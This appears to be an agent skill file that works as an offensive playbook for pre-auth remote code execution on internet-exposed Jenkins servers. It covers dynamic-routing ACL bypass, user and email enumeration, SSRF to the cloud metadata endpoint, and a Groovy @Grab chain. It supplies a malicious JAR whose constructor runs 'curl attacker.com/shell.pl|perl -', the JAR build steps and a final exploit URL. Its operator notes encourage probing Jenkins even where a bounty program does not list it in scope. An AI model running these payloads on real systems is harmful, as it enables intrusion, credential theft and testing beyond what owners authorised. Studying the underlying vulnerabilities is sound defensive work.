---
name: jenkins-rce
description: "Exploit Jenkins dynamic routing to reach pre-auth RCE — ACL bypass on instances with anonymous read disabled, Groovy script console execution, and Script Security sandbox escapes. Use when recon finds an internet-exposed Jenkins instance, a /script endpoint, or a Jenkins-branded login page."
---

# Jenkins Dynamic Routing to Pre-Auth RCE

## Crown Jewel Targets

- Internet-exposed Jenkins instances (thousands on Shodan)
- Jenkins with `ANONYMOUS_READ=False` (88% of instances — still exploitable via ACL bypass)
- Jenkins with Script Security Plugin (sandbox bypass CVEs)
- CI/CD pipelines in enterprise bug bounty scopes
- Jenkins behind Nginx/Apache reverse proxy (path confusion potential)
- Jenkins with GitHub/GitLab plugins (SSRF gadgets)

## Attack Surface Signals

- URL indicators: `/jenkins/`, Jenkins login page, `X-Jenkins` header
- API endpoint: `/api/json` accessible (version disclosure)
- Plugin list: `/pluginManager/api/json?depth=1`
- Dynamic routing: `/securityRealm/user/admin/descriptorByName/` returning 200
- Groovy console: `/script` (direct RCE if accessible)

**Source:** Orange Tsai (DEVCORE), 2019
**CVEs:** CVE-2018-1000861 (routing), CVE-2019-1003000/01/02 (sandbox bypass)
**Affected:** Jenkins < 2.138 (direct), + Script Security Plugin

## Dynamic Routing Mechanism

Jenkins resolves URLs by tokenizing `/` and matching tokens against methods:

1. `get<Token>()` / `get<Token>(String)` / `get<Token>(Int)`
2. `getDynamic(String, ...)` / `doDynamic(...)`
3. `do<Token>(...)` / `js<Token>(...)`
4. `@WebMethod` / `@JavaScriptMethod` annotated methods

Every Java class extends `java.lang.Object` → `getClass()` always matches rule #1.

## ACL Bypass via Whitelisted Paths

When `ANONYMOUS_READ=False`, Jenkins whitelists certain paths:

```java
ImmutableSet.of("/login", "/logout", "/accessDenied", "/adjuncts/",
    "/error", "/oops", "/signup", "/tcpSlaveAgentListener",
    "/federatedLoginService/", "/securityRealm", "/instance-identity");
```

Enter via whitelisted path, then chain getters to reach any object:

```
/adjuncts/whatever/class/classLoader/resource/index.jsp/content
```

Invokes: `Jenkins.getAdjuncts("whatever").getClass().getClassLoader().getResource("index.jsp").getContent()`

## Exploitation Gadget Chain

**Best gadget:**
```
/securityRealm/user/[username]/descriptorByName/[descriptor_name]/
```

Invokes: `Jenkins.getSecurityRealm().getUser(username).getDescriptorByName(descriptorName)`

Access ~500 Descriptor classes via `DescriptorByNameOwner`.

## Pre-Auth Attack Chains

### 1. User Enumeration + Email Leak

```bash
# Enumerate users
curl http://jenkins/securityRealm/user/admin/search/index?q=a

# Leak email via SECURITY-514
curl http://jenkins/securityRealm/user/admin/api/xml
```

### 2. Full-Response SSRF (via GitHub Plugin CVE-2018-1000600)

```bash
curl "http://jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://169.254.169.254/%23&login=x&password=x"
```

### 3. Pre-Auth RCE via Groovy Compile-Time Meta-Programming

**Key insight:** `parseClass()` (AST parser, no `execute()`) still runs code via Groovy's compile-time annotations.

#### Method: @Grab + @GrabResolver

Grape fetches JAR from attacker-controlled Maven repo at compile time. The `META-INF/services/org.codehaus.groovy.plugins.Runners` file in the JAR triggers `newInstance()` → constructor executes.

**Build malicious JAR:**
```java
public class Evil {
    public Evil(){
        Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "curl attacker.com/shell.pl|perl -"});
    }
}
```

```bash
javac Evil.java
mkdir -p META-INF/services/
echo Evil > META-INF/services/org.codehaus.groovy.plugins.Runners
jar cvf poc-1.jar Evil.class META-INF/
```

Host at Maven repo structure: `/tw/orange/poc/1/poc-1.jar`

**Final exploit URL:**
```
GET /descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw',root='http://attacker/')%0a@Grab(group='tw.orange',module='poc',version='1')%0aimport Evil;
```

#### Alternative: @ASTTest (simpler but less reliable)

```groovy
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec("touch /tmp/pwned")
})
def x
```

Fails when Pipeline Shared Groovy Libraries Plugin is installed (missing classpath dependencies).

## Detection Indicators

```bash
# Check if Jenkins is exposed
curl -s http://target/ | grep -i jenkins

# Check anonymous read access
curl -s http://target/api/json

# Test dynamic routing (should return 200 if vulnerable)
curl -s -o /dev/null -w "%{http_code}" http://target/securityRealm/user/admin/descriptorByName/

# Check installed plugins
curl -s http://target/pluginManager/api/json?depth=1
```

## Affected Jenkins Modes

| Mode | % of Shodan | Exploitability |
|------|-------------|----------------|
| Full access (Script Console) | Varies | Direct RCE via Groovy |
| Read-only (ANONYMOUS_READ=True) | ~12% | Information disclosure |
| Auth required (default) | ~88% | Pre-auth RCE via ACL bypass chain |

## Bug Bounty Relevance

- **CRITICAL**: Pre-auth RCE on Jenkins instances (very common in enterprise)
- Jenkins is frequently in scope for corporate bug bounty programs
- Many organizations expose Jenkins to the internet
- Even patched Jenkins may have vulnerable plugins
- Check for outdated Jenkins versions via `/api/json` or page source

## Operator Notes (Battle-Tested)

- **Whitelisted path entry is the key**: Even with `ANONYMOUS_READ=False`, paths like `/adjuncts/`, `/securityRealm/`, `/tcpSlaveAgentListener` are whitelisted. Enter via these, chain getters to reach any object.
- **`getClass()` is always available**: Every Java class extends `Object` which has `getClass()`. This matches rule #1 in dynamic routing. It is the universal traversal primitive.
- **@Grab is the cleanest RCE**: Builds a malicious JAR, hosts on a Maven repo, Groovy's Grape fetches at compile time. Works even when `@ASTTest` fails due to missing classpath deps.
- **500 Descriptor classes reachable**: Via `descriptorByName/` — each is a potential gadget. GitHub plugin gives full-response SSRF. Credentials plugin leaks secrets.
- **Check installed plugins first**: `/pluginManager/api/json?depth=1` reveals all plugins. Each plugin adds attack surface.
- **Jenkins is always in scope**: Corporate programs almost always include CI/CD infrastructure. It is worth checking even on programs that don't explicitly list it.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `cicd-pipeline-attacks` | General CI/CD attack methodology |
| `java-matrix-param-bypass` | Similar ACL bypass via path confusion |
| `deserialization-testing` → `references/java-hessian-deserialization.md` | Deser on Jenkins remoting endpoints |
| `spring-el-injection` | EL injection on Jenkins Spring components |
| `ssrf-testing` | SSRF via GitHub plugin for cloud metadata |
